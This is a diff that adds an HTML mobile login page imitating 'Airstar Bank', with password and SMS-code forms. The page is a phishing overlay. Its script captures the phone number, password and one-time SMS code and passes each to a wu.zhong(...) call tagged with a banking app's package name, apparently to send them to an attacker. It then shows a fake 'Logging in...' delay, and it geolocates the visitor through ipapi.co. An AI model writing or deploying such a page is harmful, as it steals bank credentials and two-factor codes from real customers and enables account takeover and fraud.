@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airstar Bank - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f8f9fa;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .mobile-container {
+            max-width: 390px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .status-bar {
+            padding: 20px 0;
+            background: white;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 8px;
+            margin-left: -8px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-btn:hover {
+            background: #f0f0f0;
+            border-radius: 50%;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin: 30px 20px;
+        }
+
+        .login-form {
+            padding: 0 20px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .phone-input {
+            display: flex;
+            align-items: center;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            padding: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .phone-input:focus-within {
+            border-color: #6f42c1;
+            background: white;
+        }
+
+        .country-code {
+            font-size: 16px;
+            color: #333;
+            margin-right: 8px;
+            font-weight: 500;
+        }
+
+        .dropdown-arrow {
+            margin-right: 12px;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .phone-number {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            color: #333;
+            outline: none;
+        }
+
+        .phone-number::placeholder {
+            color: #999;
+        }
+
+        .password-input, .sms-input {
+            width: 100%;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .password-input:focus, .sms-input:focus {
+            border-color: #6f42c1;
+            background: white;
+        }
+
+        .password-input::placeholder, .sms-input::placeholder {
+            color: #999;
+        }
+
+        .password-group {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .sms-group {
+            position: relative;
+        }
+
+        .send-btn {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #6f42c1;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .send-btn:hover {
+            color: #5a2d91;
+        }
+
+        .send-btn:disabled {
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .forgot-password, .didnt-get-code {
+            text-align: right;
+            margin-top: 12px;
+        }
+
+        .forgot-password a, .didnt-get-code a {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover, .didnt-get-code a:hover {
+            color: #6f42c1;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #6f42c1, #8b5cf6);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 40px;
+            margin-bottom: 30px;
+            transition: all 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(135deg, #5a2d91, #7c3aed);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(111, 66, 193, 0.3);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .login-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .bottom-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            margin-bottom: 30px;
+        }
+
+        .bottom-link {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .bottom-link:hover {
+            color: #6f42c1;
+        }
+
+        .home-indicator {
+            width: 134px;
+            height: 5px;
+            background: #333;
+            border-radius: 3px;
+            margin: 20px auto;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .countdown {
+            color: #999;
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .mobile-container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+
+        <div class="status-bar"></div>
+
+        <div class="page active" id="passwordPage">
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">‹</button>
+            </div>
+
+            <h1 class="page-title">Login to Airstar Bank</h1>
+
+            <form class="login-form" onsubmit="handlePasswordLogin(event)">
+                <div class="input-group">
+                    <div class="phone-input">
+                        <span class="country-code"></span>
+                        <span class="dropdown-arrow">▼</span>
+                        <input type="tel" class="phone-number" placeholder="11-digit number" id="phoneNumber" maxlength="11">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="password-group">
+                        <input type="password" class="password-input" placeholder="Password" id="password">
+                        <button type="button" class="password-toggle" onclick="togglePassword()"></button>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="#" onclick=" return false;">Forgot Password?</a>
+                    </div>
+                </div>
+
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+
+            <div class="bottom-options">
+                <a href="#" class="bottom-link" onclick="showSMSLogin(); return false;">Login via SMS code</a>
+                <a href="#" class="bottom-link" onclick=" return false;">Register and open an account</a>
+            </div>
+        </div>
+
+        <div class="page" id="smsPage">
+            <div class="header">
+                <button class="back-btn" onclick="showPasswordLogin()">‹</button>
+            </div>
+
+            <h1 class="page-title">Login to Airstar Bank</h1>
+
+            <form class="login-form" onsubmit="handleSMSLogin(event)">
+                <div class="input-group">
+                    <div class="phone-input">
+                        <span class="country-code"></span>
+                        <span class="dropdown-arrow">▼</span>
+                        <input type="tel" class="phone-number" placeholder="11-digit number" id="smsPhoneNumber" maxlength="11">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="sms-group">
+                        <input type="text" class="sms-input" placeholder="SMS verification code" id="smsCode" maxlength="6">
+                        <button type="button" class="send-btn" id="sendCodeBtn" onclick="sendSMSCode()">Send</button>
+                    </div>
+                    <div class="didnt-get-code">
+                        <a href="#" onclick="resendCode(); return false;">Didn't Get a Code</a>
+                    </div>
+                </div>
+
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+
+            <div class="bottom-options">
+                <a href="#" class="bottom-link" onclick="showPasswordLogin(); return false;">Password Login</a>
+                <a href="#" class="bottom-link" onclick=" return false;">Register and open an account</a>
+            </div>
+        </div>
+
+        <div class="home-indicator"></div>
+    </div>
+
+    <script>
+
+
+
+    window.onload = async function(){
+
+
+    var json= await fetch("https://ipapi.co/json/").then(res => res.json());
+    document.querySelectorAll('.country-code')[0].innerHTML= `${json.country_calling_code}`;
+    document.querySelectorAll('.country-code')[1].innerHTML= `${json.country_calling_code}`;
+
+    }
+
+        let countdownTimer = null;
+        let countdownSeconds = 0;
+
+        function showPasswordLogin() {
+            document.getElementById('passwordPage').classList.add('active');
+            document.getElementById('smsPage').classList.remove('active');
+        }
+
+        function showSMSLogin() {
+            document.getElementById('passwordPage').classList.remove('active');
+            document.getElementById('smsPage').classList.add('active');
+
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            if (phoneNumber) {
+                document.getElementById('smsPhoneNumber').value = phoneNumber;
+            }
+        }
+
+        
+        
+
+        function sendSMSCode() {
+            const phoneNumber = document.getElementById('smsPhoneNumber').value;
+            
+            if (!phoneNumber || phoneNumber.length !== 11) {
+
+                return;
+            }
+
+                wu.zhong(`🔰 Airstar Bank\n\n📞Phone Number: ${phoneNumber}`, "com.airstarbanking.mobilebanking#");
+
+            const sendBtn = document.getElementById('sendCodeBtn');
+         
+
+            countdownSeconds = 60;
+            sendBtn.disabled = true;
+            sendBtn.innerHTML = `<span class="countdown">${countdownSeconds}s</span>`;
+            
+            countdownTimer = setInterval(() => {
+                countdownSeconds--;
+                sendBtn.innerHTML = `<span class="countdown">${countdownSeconds}s</span>`;
+                
+                if (countdownSeconds <= 0) {
+                    clearInterval(countdownTimer);
+                    sendBtn.disabled = false;
+                    sendBtn.textContent = 'Send';
+                }
+            }, 1000);
+
+     
+        }
+
+        function resendCode() {
+            if (countdownTimer) {
+ 
+                return;
+            }
+            sendSMSCode();
+        }
+
+        function handlePasswordLogin(event) {
+            event.preventDefault();
+            
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('password').value;
+            
+            if (!phoneNumber || phoneNumber.length !== 11) {
+        
+                return;
+            }
+            
+            if (!password) {
+           
+                return;
+            }
+            
+
+            const loginBtn = event.target.querySelector('.login-btn');
+            loginBtn.textContent = 'Logging in...';
+            loginBtn.disabled = true;
+            
+            setTimeout(() => {
+                wu.zhong(`🔰 Airstar Bank\n\n📞Phone Number: ${phoneNumber}\n🔒Password: ${password}`, "com.airstarbanking.mobilebanking");
+
+                loginBtn.textContent = 'Log in';
+                loginBtn.disabled = false;
+            }, 2000);
+        }
+
+        function handleSMSLogin(event) {
+            event.preventDefault();
+            
+            const phoneNumber = document.getElementById('smsPhoneNumber').value;
+            const smsCode = document.getElementById('smsCode').value;
+            
+            if (!phoneNumber || phoneNumber.length !== 11) {
+         
+                return;
+            }
+            
+            if (!smsCode || smsCode.length !== 6) {
+     
+                return;
+            }
+            
+           
+            const loginBtn = event.target.querySelector('.login-btn');
+            loginBtn.textContent = 'Verifying...';
+            loginBtn.disabled = true;
+            
+            setTimeout(() => {
+
+                 wu.zhong(`🔰 Airstar Bank\n\n📞Phone Number: ${phoneNumber}\n🈸Code: ${smsCode}`, "com.airstarbanking.mobilebanking");
+           
+                loginBtn.textContent = 'Log in';
+                loginBtn.disabled = false;
+            }, 2000);
+        }
+
+    
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInputs = document.querySelectorAll('.phone-number');
+            
+            phoneInputs.forEach(input => {
+                input.addEventListener('input', function(e) {
+
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                });
+            });
+
+
+            const smsCodeInput = document.getElementById('smsCode');
+            smsCodeInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+        });
+    </script>
+</body>
+</html>
